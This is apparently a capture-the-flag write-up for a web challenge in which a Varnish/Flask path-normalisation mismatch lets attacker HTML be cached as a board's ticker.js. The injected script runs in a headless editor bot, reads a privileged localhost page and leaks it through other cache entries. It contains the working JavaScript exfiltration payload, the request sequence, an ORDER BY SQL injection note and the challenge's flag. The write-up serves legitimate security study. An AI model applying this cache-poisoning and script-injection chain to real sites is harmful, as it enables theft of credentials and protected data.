# Broadsheet Organizer

**Author:** mar

**Web** · 900 pts (hard)

**TL;DR.** Varnish computes its cache key from the **normalised** path but forwards the **raw**
path upstream. `GET /z/<zone>/embed/<token>/../../ticker.js?html=...` therefore lands in Flask's
`embed` view (which validates the token only as the first path segment and reflects `html=` raw)
while Varnish files the response under `/z/<zone>/ticker.js` — the exact object every board page
loads as a `<script src>`. The ticker VCL rule forces `application/javascript` and a ~12 s TTL and
**overrides the embed view's `no-store`**, so the duty editor's headless browser runs our
JavaScript in its own origin. That origin is `127.0.0.1`, and `/editor` trusts it without a cookie:
the script reads the rotation key and beacons it out through other zones' ticker cache entries.

## Solve

**Reconnaissance.** The floor is eight zones (`general`, `dock-2`, `nights`, `workshop`, `canteen`,
`yard`, `office`, `stores`), served by Flask behind Varnish (`X-Cache`, `Age`). The routes that
matter:

| route | behaviour |
| --- | --- |
| `/z/<zone>/board` | the board the duty editor opens; loads `/z/<zone>/ticker.js` |
| `/z/<zone>/ticker.js` | the only cacheable dynamic response (`X-Cache: HIT`, TTL ~12 s) |
| `/z/<zone>/embed/<token>?html=` | returns the `html` parameter verbatim as `text/html` (≤4000 chars) |
| `/drafts`, `/draft/<id>`, `/draft/<id>/publish` | write/publish notices; the app's only cookie is `desk=<author>` |
| `/review` (POST `zone=`) | asks the duty editor to open that zone's board |
| `/editor` | 403 to every external client: "desk sessions are issued at the editorial terminal" |
| `/roster?dept=&sort=` | staff list; `sort` is `ORDER BY`-injectable (SQLite), but the DB holds no flag |

The bot is described by the brief: it opens the board it is asked to, stays seconds, GETs only,
has no internet, and never leaves the application. It is a real browser process.

**The cache asymmetry.** Two layers disagree about what the path is:

```
Varnish:  key = normalise(path)  ->  /z/<zone>/ticker.js
          forwards the raw path  ->  /z/<zone>/embed/<token>/../../ticker.js
Flask:    embed route matches the raw path; <token> is checked only as the first segment,
          trailing segments are ignored, and ?html= is rendered verbatim
VCL:      normalised path ends in /ticker.js -> Content-Type: application/javascript,
          beresp.ttl ~12 s, cacheable  (overrides the view's Cache-Control: no-store)
```

Measured on the live box:

```
GET /z/<z>/embed/<T>/../../ticker.js?html=<js>   -> 200 application/javascript  X-Cache: MISS
GET /z/<z>/ticker.js                             -> 200 application/javascript  X-Cache: HIT
                                                    body: <js>
```

The TTL is about 12 s (HIT at Age 11, MISS at t+13.1 s), so the poison has to be refreshed while
the bot is being lured.

**Getting the bot to load it.** The board page always requests `/z/<zone>/ticker.js`, so no
navigation control is needed — only a zone with a published notice (`/review` rejects a zone with
nothing on the board) and a review request:

```http
POST /draft                 zone=<zone>&author=...&title=...&body=...
POST /draft/<id>/publish
GET  /z/<zone>              -> 12-hex embed token
POST /review                zone=<zone>
```

**The payload.** The poisoned ticker runs in the editor's page. Because that page is served from
`127.0.0.1:3402`, a same-origin `GET /editor` is answered as the editorial terminal — "Signed in
as V. Marchetti, duty editor" plus the rotation key. `document.cookie` is empty: the privilege is
the local origin, not a session cookie. The script reads `/editor`, base64-encodes the response and
posts 330-character chunks back through cacheable ticker slots:

```js
function s(v, n) { new Image().src = '/z/' + n + '/ticker.js?text=' + encodeURIComponent(String(v).slice(0, 460)); }
s('PING', '<ping-slot>');
s('CK=' + document.cookie + '|U=' + location.href, '<meta-slot>');
var x = new XMLHttpRequest();
x.open('GET', '/editor', true);
x.onload = function () {
  var t = x.responseText, b = btoa(unescape(encodeURIComponent(t)));
  s('EDLEN=' + t.length, '<len-slot>');
  for (var i = 0; i * 330 < b.length; i++) s(b.slice(i * 330, (i + 1) * 330), '<exfil-slot>' + (i + 1));
};
x.send();
```

**The full chain, in order.**

1. Publish one notice in a fresh zone so `/review` accepts it.
2. `GET /z/<zone>` and pull the 12-hex embed token out of the page.
3. `POST /review zone=<zone>`.
4. Start poisoning `/z/<zone>/embed/<token>/../../ticker.js?html=<urlencoded JS>` and re-poison
   every ~12.6 s until the duty-log row for the zone appears. The bot's page load lands 10–32 s
   after the POST, so a single 12 s entry usually expires first.
5. The bot opens `/z/<zone>/board`; its `<script src="/z/<zone>/ticker.js">` is a cache HIT of our
   JavaScript, which executes.
6. The script fetches `/editor`, base64s the answer, and writes it into `/z/<exfil-slot>/ticker.js`
   slots (500 characters each; base64 avoids percent-encoding blow-up).
7. Read the slots back immediately (their writes are seconds old, TTL 12 s), concatenate and
   base64-decode. The editor page was 1179 bytes, six chunks, and the flag was in chunk 5.

For the ticker slots the zone segment does not have to correspond to a real zone; a review does
need one with a published notice. The embed token is minted by any `GET /z/<zone>` and is valid for
that zone only.

**Why the pieces are needed.** The embed view alone is a sandboxed iframe with no same-origin, so
its raw HTML is useless unless it is loaded top-level. The ticker alone is escaped into
`textContent`, so it cannot carry code. The path-normalisation bug is what joins them: the origin
serves attacker HTML, while the cache files it under a JavaScript URL in the bot's own origin.

**Dead ends (all measured).**

- **`/editor` from any HTTP client.** 1,400+ desk/cookie/parameter/header combinations return the
  same byte-identical 403 (1365 bytes, `sha256 9fbb17345110…`); 2,107 paths probed for an issuance
  route found nothing; it is not cached and not state-dependent. The desk session is bot-only —
  which is exactly why it had to be read from inside the bot.
- **Cache-deception onto `/app.js` or `/style.css`.** `/z/<z>/embed/<T>/../../app.js?html=...`
  renders our HTML at that key, but the response honours `no-store` (three MISSes, the real 2439-byte
  `/app.js` stayed intact). The generic static rule does not override `no-store`; only the explicit
  ticker rule does.
- **Stored XSS in notices.** Every notice/draft field is escaped in every context (HTML, `<title>`,
  attribute, href): a 15-payload battery across board/notice/search/print/drafts produced zero
  unescaped bytes.
- **Ticker text injection.** `?text=` is JSON-escaped into `el.textContent` (quotes, backslash,
  CR/LF/TAB/NUL, U+2028/9 all escaped); the 500-character cap applies before escaping. Text, not
  code.
- **Steering the bot elsewhere.** Extra `/review` fields (`url`, `path`, `target`, `board`) are
  ignored; the bot does not scrape notice text for URLs and does not render notice fields as HTML
  (proven with witness slots that stayed MISS).
- **Header injection / open redirect.** `author` CRLF is percent-encoded into `Set-Cookie`; body
  CRLF stays in the body; every redirect is POST-only with a server-built `Location`.
- **SQL injection in `/roster`.** `sort` is injectable (`CASE WHEN` error oracle, `UNION SELECT`
  over `staff`/`shift`/`desk`), but those three tables contain no flag.
- **Reviews sweep the board.** Non-standing notices are removed by a review, so a payload posted
  long before the visit will not survive; publish and review in the same window.

**Flag:** `CSCTF{iJPBtyIgDoAePSGUNv7Gd7pz}`

Run [the solver](solve.py) with `CTF_HOST=<host> CTF_PORT=<port> python3 solve.py` (it uses
`h.py`, a raw-socket HTTP client, and prints the duty-log timing plus the decoded editor page).
Web addresses must be your assigned instance.

*AI: Hermes (DeepSeek 4.1 Flash) assembled this writeup from the team's lane notes and packaged the
solver; the exploit chain and every negative result above were measured by the team on the live
instance, and the flag is the one the platform accepted.*
